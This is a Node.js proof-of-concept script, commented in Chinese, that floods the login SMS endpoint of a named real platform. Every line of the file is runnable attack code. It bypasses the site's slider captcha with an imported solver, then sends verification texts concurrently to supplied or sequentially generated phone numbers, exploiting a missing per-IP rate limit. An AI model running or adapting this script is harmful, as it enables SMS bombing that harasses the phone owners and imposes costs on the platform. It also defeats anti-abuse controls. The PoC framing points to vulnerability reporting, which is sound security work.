#!/usr/bin/env node
/**
 * 缺陷 B PoC · platform.huimengi.com 短信通道单 IP 无频控
 *
 * 用法：
 *   node poc_sms_flood.mjs 19900000011 19900000012 ...      # 指定号码
 *   node poc_sms_flood.mjs --gen 19900000000 100            # 从起始号连续发 100 个
 *   node poc_sms_flood.mjs --gen 19900000000 100 --conc 3   # 3 并发
 *
 * 原理：
 *   1. lib_captcha.mjs 用 NCC 解出滑块 → POST /api/auth/captcha/behavior 拿 0000
 *   2. 组装 captchaVerification（明文 token---JSON）→ POST /api/auth/sms/send
 *   3. 每个号码独立票据，号码维度 600s 冷却、IP 维度无限制
 */
import { captchaVerification, B, H } from './lib_captcha.mjs';

const args = process.argv.slice(2);
let phones = [];
let conc = 2;
if (args[0] === '--gen') {
  const start = args[1], n = parseInt(args[2] || '10', 10);
  const prefix = start.slice(0, -String(n).length);
  for (let i = 0; i < n; i++) phones.push(prefix + String(i).padStart(start.length - prefix.length, '0'));
} else {
  phones = args.filter(a => /^1\d{10}$/.test(a));
}
const ci = args.indexOf('--conc');
if (ci >= 0) conc = parseInt(args[ci + 1] || '2', 10);

if (!phones.length) { console.error('usage: node poc_sms_flood.mjs 19900000011 [...] | --gen 19900000000 100'); process.exit(1); }

let ok = 0, fail = 0, idx = 0;
async function worker(id) {
  while (idx < phones.length) {
    const phone = phones[idx++];
    const t0 = Date.now();
    try {
      const cv = await captchaVerification(() => {});
      const r = await fetch(B + '/api/auth/sms/send', {
        method: 'POST', headers: H,
        body: JSON.stringify({ phone, scene: 'login', captchaVerification: cv }),
        signal: AbortSignal.timeout(15000),
      });
      const t = await r.text();
      let j = {}; try { j = JSON.parse(t); } catch {}
      const sent = j.code === '0';
      sent ? ok++ : fail++;
      console.log(`[${id}] ${phone} ${sent ? 'SENT' : 'REJECT'} ${Date.now() - t0}ms ${t.slice(0, 90)}`);
    } catch (e) {
      fail++;
      console.log(`[${id}] ${phone} ERROR ${e.message.slice(0, 60)}`);
    }
  }
}
await Promise.all(Array.from({ length: conc }, (_, i) => worker(i + 1)));
console.log(`\n完成：成功 ${ok} / 失败 ${fail} / 共 ${phones.length}`);
